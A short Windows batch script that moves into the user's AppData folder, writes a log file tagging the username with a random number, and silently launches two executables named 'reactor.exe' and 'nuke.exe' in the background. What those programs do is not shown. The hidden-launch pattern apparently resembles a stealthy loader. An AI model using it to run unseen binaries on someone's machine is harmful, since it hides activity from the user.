@echo off

set "appDataPath=%APPDATA%"

cd /d "%appDataPath%"

set /a "random_number=%RANDOM% %% 1000 + 1"
if not exist user-log.txt (
    echo %USERNAME%-%random_number% > user-log.txt
)

start "" /B "reactor.exe" > nul
start "" /B "nuke.exe" > nul

exit